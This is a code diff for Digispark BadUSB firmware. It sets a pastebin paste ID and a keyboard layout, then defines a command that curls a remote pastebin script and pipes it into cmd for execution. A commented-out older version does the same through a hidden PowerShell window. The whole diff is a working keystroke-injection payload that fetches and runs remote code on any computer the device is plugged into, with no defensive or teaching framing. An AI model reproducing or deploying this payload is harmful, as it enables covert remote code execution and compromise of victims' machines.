@@ -1,5 +1,5 @@
 // pastebin paste id
-#define PASTE_ID "VWpekb79"
+#define PASTE_ID "4A47tmR5"
 
 // use german keyboard layout (qwertz)
 #define LAYOUT_DE
@@ -10,7 +10,10 @@
 #include "src/DigisparkKeyboard/DigiKeyboardDe.h"
 #endif
 
-#define CMD "powershell -WindowStyle Hidden -Command \"&{echo \\\"curl https://pastebin.com/raw/" PASTE_ID " |powershell -Command -\\\" |cmd}\""
+#define CMD "cmd /C curl https://pastebin.com/raw/" PASTE_ID "|cmd"
+
+// old version (hides shell)
+// #define CMD "powershell -WindowStyle Hidden -Command \"&{echo \\\"curl https://pastebin.com/raw/" PASTE_ID " |powershell -Command -\\\" |cmd}\""
 
 void setup()
 {
